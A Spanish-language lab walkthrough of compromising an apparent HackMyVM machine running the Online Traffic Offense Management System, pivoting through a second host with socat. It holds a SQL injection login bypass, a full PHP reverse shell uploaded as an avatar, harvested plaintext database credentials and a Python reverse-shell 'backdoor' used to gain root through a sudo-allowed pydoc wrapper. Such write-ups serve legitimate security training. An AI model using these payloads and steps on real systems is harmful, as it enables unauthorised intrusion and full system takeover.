# Reconocimiento

Realizo un reconocimiento activo inicial ante el objetivo.

Comando:

```bash
proxychains nmap -sT -Pn -T4 -p- --open 192.168.57.4 -oN TCP-SCAN-192.168.57.4.txt
```

Resultado:

```
Nmap scan report for 192.168.57.4
Host is up (0.013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
```

Conclusión:

Aparentemente tan solo un puerto abierto, el 80 con un servicio HTTP.

Ahora que tenemos más acotada la superficie de ataque realizo un escaneo añadiendo los scripts de nmap y la detección de versiones.

Comando:

```bash
proxychains nmap -sT -Pn -sC -sV -p80 192.168.57.4 -oN portsan-192.168.57.4.txt
```

Resultado:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Online Traffic Offense Management System - PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

Conclusión:

- **Único puerto abierto: 80/tcp**: superficie de ataque reducida a un solo vector (web)
- **nginx 1.18.0** como servidor web
- **Aplicación identificada:** _"Online Traffic Offense Management System"_  PHP
- **Cookie `PHPSESSID` sin flag `httponly`**: vulnerable a robo de sesión vía JavaScript/XSS

# Enumeración

Para poder acceder de forma gráfica al servicio http en el puerto 80 voy a abrir un navegador que pase por el túnel.

Comando:

```bash
proxychains firefox http://192.168.57.4/
```

Resultado:

![[../images/D01.png]]

Conclusión:

Puedo acceder a la aplicación, pero no se cargan bien los recursos. Viendo el código fuente veo que se cargan desde "http://doc.hmv/" por lo que es un problema de virtual hosting.

Comando:

```bash
sudo nano /etc/hosts
```

Añado:

```
192.168.57.4    doc.hmv
```

Resultado:

![[../images/D02.png]]

Ahora sí puedo visualizar bien la web.

La aplicación es un proyecto open source de gestión de tráfico. Podemos encontrar el código online ya que es una aplicación gratuita.
https://www.sourcecodester.com/php/14909/online-traffic-offense-management-system-php-free-source-code.html

La web tiene un login, el cual puede ser vulnerable a fuerza bruta o a SQLi.

![[../images/D03.png]]

He hecho Fuzzing de directorios y no he visto nada relevante.
# Explotación

Intento explotar el login con un login bypass de SQLi.

![[../images/D04.png]]

Resultado:

Consigo acceso como administrador a la aplicación.

![[../images/D05.png]]

Encuentro un editor de perfil, en el cual hay un editor de avatar. Pruebo a subir un example.php para ver si admite cualquier tipo de archivos, y veo que se puede subir sin problemas, por lo que es posible que sea vulnerable a ejecución remota de comandos por una subida de archivos arbitraria.

Como mi máquina atacante y la víctima no tienen conectividad directa, tengo que crear el camino antes de subir un archivo que me permita obtener una reverse shell. Para ello usaremos la máquina FALL como nodo intermedio utilizando socat.

Para ello debemos pasar socat a la máquina FALL, por lo tanto me descargo un binario estático para poder hacerlo.

Comando:

```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat_static
chmod +x socat_static
```

Traspaso el binario a FALL por scp.

Comando:

```bash
scp -i id_rsa socat_static qiu@192.168.56.4:/tmp/socat
```

Desde la máquina FALL le doy permisos de ejecución.

Comando:

```bash
chmod +x /tmp/socat
```

Desde FALL ejecuto el listener.

```bash
/tmp/socat TCP-LISTEN:4445,fork,bind=192.168.57.3 TCP:192.168.56.5:4444
```

Ahora pongo mi máquina atacante a la escucha.

Comando:

```bash
nc -lvnp 4444
```

Desde mi máquina atacante creo un fichero php con el payload. Utilizaré la reverse shell de pentestmonkey.

Comando:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.57.3';
$port = 4445;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Subo el fichero al editor de fotos, espero que tener una shell, pero no llega. En el reconocimiento de la máquina FALL llegamos a la conclusión de que el firewall bloqueaba el tráfico de todos los puertos que no estuvieran en una lista blanca, por lo que es posible que falle por eso.

Por lo tanto debo usar un puerto que sí aceptó tráfico, como el 8000, el cual daba estado "closed".

Desde FALL, con socat apunto al puerto 8000.

Comando:

```bash
/tmp/socat TCP-LISTEN:8000,fork,bind=192.168.57.3 TCP:192.168.56.5:4444
```

En otra sesión confirmo que está a la espera.

Comando:

```bash
ss -tlnp | grep 8000
```

Resultado:

```
LISTEN   0         5              192.168.57.3:8000             0.0.0.0:*        users:(("socat",pid=5750,fd=5))                                                
```

Modifico el payload para que apunte al puerto 8000.

Comando:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.57.3';
$port = 8000;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Vuelvo a subir el payload al campo de foto de perfil.

Resultado:

```bash
listening on [any] 4444 ...
connect to [192.168.56.5] from (UNKNOWN) [192.168.56.4] 52160
Linux doc 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
 10:19:31 up  3:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Conclusión:

Se ha montado un relay con `socat` en su interfaz interna, que reenvía cualquier conexión entrante hacia mi máquina atacante. El primer intento (puerto 4445) fue bloqueado por el firewall de FALL, que solo permite tráfico hacia una lista fija de puertos, lo cual se vio en su reconocimiento. Cambiando el relay a uno de esos puertos permitidos (8000), la conexión pudo completarse y se recibió la reverse shell correctamente, obteniendo acceso como `www-data` en DOC.

# Post-Explotación

La reverse shell obtenida es básica y no soporta correctamente comandos interactivos.

Comando:

```bash
script /dev/null -c bash
```

Control Z para suspender sesión.

En la máquina atacante.

Comando:

```bash
stty raw -echo; fg
```

```bash
export TERM=xterm
```

En una shell de mi máquina atacante.

Comando:

```bash
stty size
```

Resultado:

```bash
59 253
```

Comando:

```bash
stty rows 59 columns 253
```

Resultado:

Se estabiliza la shell reversa obteniendo una TTY completamente funcional, equivalente a una sesión interactiva normal.

Reconocimiento inicial del entorno.

Comando:

```bash
whoami; id; hostname; uname -a; pwd
```

Resultado:

```
uname -a
Linux doc 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
www-data@doc:/$ whoami; id; hostname; uname -a; pwd
whoami; id; hostname; uname -a; pwd
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
doc
Linux doc 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
/
```

Con acceso como `www-data`, busco ficheros de configuración de la aplicación web que puedan contener credenciales de base de datos, siguiendo el patrón típico de proyectos PHP sin gestión segura de secretos.

Comando:

```bash
find / -iname "config.php" 2>/dev/null
```

Resultado:

```bash
/var/www/html/traffic_offense/config.php
```

Conclusión:

Se localiza el fichero de configuración principal de la aplicación, confirmando también el nombre del proyecto (`traffic_offense`), consistente con lo identificado previamente en la fase de enumeración web.

Reviso el contenido del fichero de configuración para buscar credenciales de conexión a la base de datos.

Comando:

```bash
cat /var/www/html/traffic_offense/config.php
```

Resultado:

```php
<?php
ob_start();
ini_set('date.timezone','Asia/Manila');
date_default_timezone_set('Asia/Manila');
session_start();
require_once('initialize.php');
require_once('classes/DBConnection.php');
require_once('classes/SystemSettings.php');
$db = new DBConnection;
$conn = $db->conn;
...
?>
```

Conclusión:

El fichero no contiene las credenciales directamente, sino que las delega a `classes/DBConnection.php`, que a su vez depende de constantes definidas en otro fichero.

Sigo la cadena de dependencias revisando `DBConnection.php` para localizar dónde se definen las credenciales reales.

Comando:

```bash
cat /var/www/html/traffic_offense/classes/DBConnection.php
```

Resultado:

```php
<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{
    private $host = DB_SERVER;
    private $username = DB_USERNAME;
    private $password = DB_PASSWORD;
    private $database = DB_NAME;
    ...
```

Conclusión:

Las credenciales se definen como constantes (`DB_SERVER`, `DB_USERNAME`, `DB_PASSWORD`, `DB_NAME`) en el fichero `initialize.php`, ubicado un nivel por encima.

Reviso `initialize.php` para obtener las credenciales reales de conexión a la base de datos.

Comando:

```bash
cat /var/www/html/traffic_offense/initialize.php
```

Resultado:

```php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://doc.hmv/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"be114yTU");
if(!defined('DB_NAME')) define('DB_NAME',"doc");
?>
```

Conclusión:  

Se obtienen credenciales de MySQL en texto plano (`bella` / `be114yTU`, base de datos `doc`). Adicionalmente, se identifica una cuenta de desarrollador hardcodeada (`dev_oretnom`) con una contraseña en formato hash MD5 (`5da283a2d990e8d8512cf967df5bc0d0`), correspondiente a una práctica insegura de dejar credenciales de desarrollo olvidadas en el entorno de producción. 

Trato de logearme como bella.

Comando:

```bash
su bella
```

Resultado:

```
bella@doc:/$ whoami
bella
bella@doc:/$ id
uid=1000(bella) gid=1000(bella) groups=1000(bella),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

Conclusión: 

Se confirma la reutilización de credenciales entre la aplicación web y el sistema operativo, logrando escalada horizontal de `www-data` a `bella`.

Reviso los privilegios de sudo del usuario `bella` para identificar posibles vías de escalada vertical a root.

Comando:

```bash
sudo -l
```

Resultado:

```
User bella may run the following commands on doc:
    (ALL : ALL) NOPASSWD: /usr/bin/doc
```

Conclusión:  

`bella` puede ejecutar un binario llamado `/usr/bin/doc` como root, sin necesidad de contraseña. Al no ser un binario estándar del sistema, se investiga qué hace exactamente.

Analizo el binario `/usr/bin/doc` para entender su funcionamiento interno antes de ejecutarlo.

Comando:

```
file /usr/bin/doc
strings /usr/bin/doc
```

Resultado:

```
/usr/bin/pydoc3.9 -p 7890
```

Conclusión:

El binario es un simple wrapper que ejecuta `pydoc3.9 -p 7890`, es decir, levanta el servidor web de documentación de Python en el puerto 7890. Como se ejecuta vía `sudo`, ese servidor corre con privilegios de root.

Según la documentación oficial de `pydoc`, este busca módulos Python para documentar en el entorno y directorio desde el que se ejecuta. Si se coloca un script malicioso en el directorio de trabajo actual antes de lanzar el binario, `pydoc` podría indexarlo e importarlo, ejecutando su código con los privilegios del proceso, en este caso root.

Comando:

```bash
cd /tmp
```

```bash
cat << 'EOF' > backdoor.py
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.57.3", 8000))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/bash", "-i"])
EOF
```

```bash
chmod +x backdoor.py
```

Conclusión:  

Preparo un script Python que, al ser importado, abre una conexión de red y entrega una shell interactiva. Se apunta a `192.168.57.3` (la interfaz interna de FALL, usada como relay de pivoting) en vez de a la IP del atacante, ya que DOC no tiene ruta directa a la red externa.

Lanzo el binario `doc` (como root, vía sudo) desde `/tmp`, para que ese directorio forme parte del entorno de búsqueda de pydoc.

Comando:

```bash
sudo -b /usr/bin/doc < <(tail -f /dev/null) > /tmp/doc_output.log 2>&1
```

Resultado:

```bash
ps aux | grep doc
```

```
root  2080  sudo -b /usr/bin/doc
root  2081  /usr/bin/doc
root  2082  sh -c /usr/bin/pydoc3.9 -p 7890
root  2083  /usr/bin/python3.9 /usr/bin/pydoc3.9 -p 7890
```

```bash
ss -tlnp | grep 7890
```

```
LISTEN  127.0.0.1:7890
```

Conclusión: 

El servidor pydoc queda corriendo correctamente como root, escuchando en el puerto 7890. Redirigir la entrada desde un flujo infinito (`tail -f /dev/null`) evita que el prompt interactivo del binario reciba un EOF inmediato, que provocaría su cierre automático.

Confirmo que pydoc ha detectado el módulo malicioso en su índice.

Comando:

```bash
curl -s http://127.0.0.1:7890/ | grep -i backdoor
```

**Resultado:**

```html
<a href="backdoor.html">backdoor</a>
```

**Conclusión:**  
El módulo `backdoor` aparece listado, confirmando que `/tmp` está siendo escaneado por el proceso pydoc.

Se solicita a pydoc que genere la documentación del módulo, forzando su importación real por parte de Python.

Comando:

```bash
curl 'http://127.0.0.1:7890/get?key=backdoor'
```

Resultado:  

En el listener previamente preparado en la máquina atacante:

```
listening on [any] 4444 ...
connect to [192.168.56.5] from (UNKNOWN) [192.168.56.4] 52246
root@doc:/tmp#
```

Conclusión:  

Al solicitar la documentación del módulo, Python ejecuta internamente `import backdoor`, lo que dispara el código de nivel superior del script (fuera de cualquier función), estableciendo una conexión de red que entrega una shell interactiva. Como el proceso pydoc se ejecutaba con privilegios de root, la shell resultante también lo es.

Confirmo el nivel de acceso conseguido y se recupera evidencia de compromiso total del sistema.

Comando:

```bash
whoami
id
hostname
```

**Resultado:**

```
root
uid=0(root) gid=0(root)
doc
```

Conclusión: 

Se confirma la escalada de privilegios completa a root en la máquina DOC. La vulnerabilidad de fondo es una configuración insegura de sudoers: permitir la ejecución sin restricciones de un binario que internamente invoca una herramienta de propósito general (pydoc), cuyo diseño permite ejecución de código arbitrario a través de la funcionalidad legítima de importación de módulos Python.